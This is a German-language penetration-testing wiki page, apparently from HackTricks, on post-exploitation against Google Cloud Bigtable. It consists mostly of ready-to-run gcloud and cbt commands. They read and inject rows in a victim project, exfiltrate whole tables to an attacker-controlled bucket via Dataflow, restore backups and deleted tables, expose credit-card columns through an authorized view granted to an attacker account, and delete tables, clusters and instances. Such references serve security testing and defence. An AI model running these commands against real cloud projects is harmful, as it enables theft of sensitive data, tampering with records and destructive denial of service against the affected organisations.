# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Für weitere Informationen zu Bigtable siehe:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Installiere die `cbt` CLI einmal über das Cloud SDK, damit die untenstehenden Befehle lokal funktionieren:
>
> <details>
>
> <summary>cbt CLI installieren</summary>
>
> ```bash
> gcloud components install cbt
> ```
>
> </details>

### Zeilen lesen

**Berechtigungen:** `bigtable.tables.readRows`

`cbt` wird mit dem Cloud SDK geliefert und kommuniziert direkt mit den admin/data APIs, ohne zusätzliche Middleware. Richte es auf das kompromittierte project/instance und extrahiere die Zeilen direkt aus der Tabelle. Beschränke den Scan, wenn du nur kurz hineinschauen willst.

<details>

<summary>Bigtable-Einträge lesen</summary>
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
</details>

### Zeilen schreiben

**Berechtigungen:** `bigtable.tables.mutateRows`, (Sie benötigen `bigtable.tables.readRows`, um die Änderung zu bestätigen).

Verwenden Sie dasselbe Tool, um upsert arbitrary cells. Dies ist der schnellste Weg, um backdoor configs zu platzieren, web shells abzulegen oder poisoned dataset rows zu pflanzen.

<details>

<summary>Bösartige Zeile injizieren</summary>
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
</details>

`cbt set` akzeptiert Rohbytes über die `@/path`-Syntax, sodass Sie kompilierte payloads oder serialisierte protobufs genau so hochladen können, wie es die downstream-Services erwarten.

### Zeilen in deinen Bucket exportieren

**Permissions:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Es ist möglich, den Inhalt einer gesamten Tabelle in einen vom Angreifer kontrollierten Bucket zu exfiltrieren, indem man einen Dataflow-Job startet, der Zeilen in einen GCS-Bucket streamt, den man kontrolliert.

> [!NOTE]
> Beachte, dass du die Berechtigung `iam.serviceAccounts.actAs` für ein SA mit ausreichenden Rechten benötigst, um den Export durchzuführen (standardmäßig — sofern nicht anders angegeben — wird das default compute SA verwendet).

<details>

<summary>Export Bigtable to GCS bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

> [!NOTE]
> Wechseln Sie die Vorlage zu `Cloud_Bigtable_to_GCS_Parquet` oder `Cloud_Bigtable_to_GCS_SequenceFile`, wenn Sie Parquet/SequenceFile-Ausgaben statt JSON möchten. Die Berechtigungen sind dieselben; nur der Vorlagenpfad ändert sich.

### Zeilen importieren

**Berechtigungen:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Es ist möglich, den Inhalt einer gesamten Tabelle aus einem vom Angreifer kontrollierten Bucket zu importieren, indem man einen Dataflow-Job startet, der Zeilen in einen von Ihnen kontrollierten GCS-Bucket streamt. Dafür muss der Angreifer zunächst eine parquet-Datei mit den zu importierenden Daten im erwarteten Schema erstellen. Ein Angreifer könnte die Daten zunächst im parquet-Format exportieren, indem er der vorherigen Technik folgt und die Einstellung `Cloud_Bigtable_to_GCS_Parquet` verwendet, und anschließend neue Einträge in die heruntergeladene parquet-Datei hinzufügen.



> [!NOTE]
> Beachten Sie, dass Sie die Berechtigung `iam.serviceAccounts.actAs` über ein SA mit ausreichenden Rechten benötigen, um den Export durchzuführen (standardmäßig, sofern nicht anders angegeben, wird das default compute SA verwendet).

<details>

<summary>Import von GCS-Bucket nach Bigtable</summary>
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

### Backups wiederherstellen

**Permissions:** `bigtable.backups.restore`, `bigtable.tables.create`.

Ein Angreifer mit diesen Berechtigungen kann ein Backup in eine neue, von ihm kontrollierte Tabelle wiederherstellen, um alte sensible Daten zu rekonstruieren.

<details>

<summary>Bigtable-Backup wiederherstellen</summary>
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
</details>

### Gelöschte Tabellen wiederherstellen

**Berechtigungen:** `bigtable.tables.undelete`

Bigtable unterstützt weiche Löschung (soft-deletion) mit einer Schonfrist (typischerweise standardmäßig 7 Tage). Während dieses Zeitraums kann ein Angreifer mit der Berechtigung `bigtable.tables.undelete` eine kürzlich gelöschte Tabelle wiederherstellen und alle ihre Daten zurückgewinnen, wodurch möglicherweise auf sensitive Informationen zugegriffen wird, die als vernichtet galten.

Dies ist besonders nützlich für:
- Wiederherstellung von Daten aus Tabellen, die während der Incident Response von Verteidigern gelöscht wurden
- Zugriff auf historische Daten, die absichtlich gelöscht wurden
- Rückgängigmachen versehentlicher oder böswilliger Löschungen, um Persistenz zu erhalten

<details>

<summary>Gelöschte Bigtable-Tabelle wiederherstellen</summary>
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
</details>

> [!NOTE]
> Der undelete-Vorgang funktioniert nur innerhalb des konfigurierten Aufbewahrungszeitraums (Standard 7 Tage). Nach Ablauf dieses Zeitraums werden die Tabelle und ihre Daten dauerhaft gelöscht und können mit dieser Methode nicht wiederhergestellt werden.


### Erstellen von Authorized Views

**Permissions:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views ermöglichen es, eine kuratierte Teilmenge der Tabelle darzustellen. Anstatt dem Prinzip der minimalen Rechte zu folgen, verwenden Sie sie, um **genau die sensitiven Spalten-/Zeilenmengen** zu veröffentlichen, die Sie interessieren, und setzen Sie Ihren eigenen Principal auf die Whitelist.

> [!WARNING]
> Der Punkt ist, dass man, um eine authorized view zu erstellen, auch Zeilen in der Basistabelle lesen und verändern können muss; daher erhält man keine zusätzlichen Berechtigungen — diese Technik ist deshalb größtenteils nutzlos.

<details>

<summary>Authorized view erstellen</summary>
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
</details>

Da der Zugriff auf die Ansicht beschränkt ist, übersehen Verteidiger oft, dass du gerade einen neuen hochsensiblen Endpunkt erstellt hast.

### Autorisierte Views lesen

**Berechtigungen:** `bigtable.authorizedViews.readRows`

Wenn du Zugriff auf eine autorisierte Ansicht hast, kannst du Daten daraus mit den Bigtable-Clientbibliotheken lesen, indem du den Namen der autorisierten Ansicht in deinen Leseanfragen angibst. Beachte, dass die autorisierte Ansicht vermutlich einschränkt, worauf du aus der Tabelle zugreifen kannst. Unten ein Beispiel in Python:

<details>

<summary>Aus einer autorisierten Ansicht lesen (Python)</summary>
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
</details>

### Denial of Service durch Löschoperationen

**Berechtigungen:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Jede der Bigtable-Löschberechtigungen kann für Denial-of-Service-Angriffe missbraucht werden. Ein Angreifer mit diesen Berechtigungen kann den Betrieb stören, indem er kritische Bigtable-Ressourcen löscht:

- **`bigtable.appProfiles.delete`**: Anwendungprofile löschen, wodurch Client-Verbindungen und Routing-Konfigurationen unterbrochen werden
- **`bigtable.authorizedViews.delete`**: Autorisierte Views entfernen und legitime Zugriffspfade für Anwendungen abschneiden
- **`bigtable.authorizedViews.deleteTagBinding`**: Tag-Bindings aus autorisierten Views entfernen
- **`bigtable.backups.delete`**: Backup-Snapshots zerstören und Disaster-Recovery-Optionen eliminieren
- **`bigtable.clusters.delete`**: Ganze Cluster löschen, was sofortige Datenunverfügbarkeit zur Folge hat
- **`bigtable.instances.delete`**: Komplette Bigtable-Instanzen entfernen und alle Tabellen sowie Konfigurationen löschen
- **`bigtable.tables.delete`**: Einzelne Tabellen löschen, was Datenverluste und Anwendungsfehler verursacht

<details>

<summary>Bigtable-Ressourcen löschen</summary>
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
</details>

> [!WARNING]
> Löschvorgänge sind häufig sofort und irreversibel. Stellen Sie vor dem Testen dieser Befehle sicher, dass Backups vorhanden sind, da sie dauerhaften Datenverlust und schwerwiegende Dienstunterbrechungen verursachen können.

{{#include ../../../banners/hacktricks-training.md}}
